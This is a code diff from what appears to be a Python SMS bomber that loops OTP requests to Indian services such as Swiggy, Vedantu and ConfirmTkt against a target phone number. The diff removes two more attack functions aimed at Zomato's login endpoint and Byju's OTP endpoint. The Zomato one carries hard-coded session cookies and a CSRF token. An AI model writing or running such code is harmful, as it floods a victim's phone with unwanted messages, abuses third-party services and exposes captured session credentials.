@@ -183,47 +183,6 @@ def vedantu_api():
 	else:
 		print('Failed - Vedantu')
 
-def zomato_api():
-
-
-	url = 'https://www.zomato.com/webroutes/auth/login'
-
-	_headers = {
-		'Host': 'www.zomato.com',
-		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
-		'Accept': '*/*',
-		'Accept-Language': 'en-US,en;q=0.5',
-		'Accept-Encoding': 'gzip, deflate, br',
-		'Referer': 'https://www.zomato.com/',
-		'Content-Type': 'application/json',
-		'x-zomato-csrft': '359414b72c3bb80111e76052a1aaf757',
-		'Cookie': 'AWSALBTG=mIo1FJV/Azo5KXjgrrbiATjoK+v3JAdQ5mcUe09HiGqYYfndJ1rhl3lkxie7u/El1tDMfSLOypY/96ygyhx6qV116z0NWfJfplYz4luWimqpg/YWmQGfGeA4eiB19odOnheCWfs4HFmF40pk1tNfQeHlsl7/MeBSjstc+tVkxt7f; AWSALBTGCORS=mIo1FJV/Azo5KXjgrrbiATjoK+v3JAdQ5mcUe09HiGqYYfndJ1rhl3lkxie7u/El1tDMfSLOypY/96ygyhx6qV116z0NWfJfplYz4luWimqpg/YWmQGfGeA4eiB19odOnheCWfs4HFmF40pk1tNfQeHlsl7/MeBSjstc+tVkxt7f; PHPSESSID=84fbfc90f6f6c9a1d4662ef57a26e0ec; csrf=359414b72c3bb80111e76052a1aaf757; fbcity=11464; fre=0; rd=1380000; zl=en; fbtrack=011e26a1168ade225bf2a89bbe987216; ltv=11464; lty=11464; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A8.1833%2C%22lng%22%3A77.4119%2C%22cityId%22%3A11464%2C%22ltv%22%3A11464%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A33562%2C%22fen%22%3A%22Nagercoil%22%7D; _gcl_au=1.1.1100193495.1646824391; _ga=GA1.2.200751515.1646824391; _gid=GA1.2.1261746266.1646824391; _fbp=fb.1.1646824392788.473947926; G_ENABLED_IDPS=google',
-		'Origin': 'https://www.zomato.com',
-		'Content-Length': '80',
-		'Connection': 'keep-alive',
-		'Sec-Fetch-Dest': 'empty',
-		'Sec-Fetch-Mode': 'cors',
-		'Sec-Fetch-Site': 'same-origin',
-	}
-
-	data = {"country_id":1,"phone":""+mobno,"verification_type":"sms","method":"phone"}
-
-	requests = rq.post(url,headers=_headers,json=data)
-
-	if requests.status_code == 200:
-		print('Success - Zomato')
-	else:
-		print('Failed - Zomato')
-
-def byjus_api():
-	payload = {'mobile':'+91-'+mobno}
-	
-	url = 'https://students.byjus.com/mobiles/request_otp'
-
-	requests = rq.get(url,params=payload)
-
-	print('success')
-
 
 
 for x in range(0,quantity):
@@ -233,5 +192,3 @@ for x in range(0,quantity):
 	confirmtkt_api()
 	swiggy_api()
 	vedantu_api()
-	zomato_api()
-	byjus_api()
